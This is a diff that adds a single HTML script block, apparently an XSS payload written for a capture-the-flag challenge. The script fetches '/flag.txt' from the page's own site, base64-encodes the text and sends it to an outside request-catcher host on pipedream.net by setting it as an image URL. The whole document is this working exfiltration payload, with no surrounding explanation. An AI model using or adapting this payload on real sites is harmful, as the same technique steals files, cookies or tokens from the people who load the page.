@@ -1,0 +1,8 @@
+<script>
+fetch('/flag.txt', {mode: 'no-cors'}).then(function(r) {
+  r.text().then(function(f) {
+    var img = document.createElement('img');
+    img.src = 'https://envxss8tbalzt.x.pipedream.net/?q=' + btoa(f);
+  })
+})
+</script>
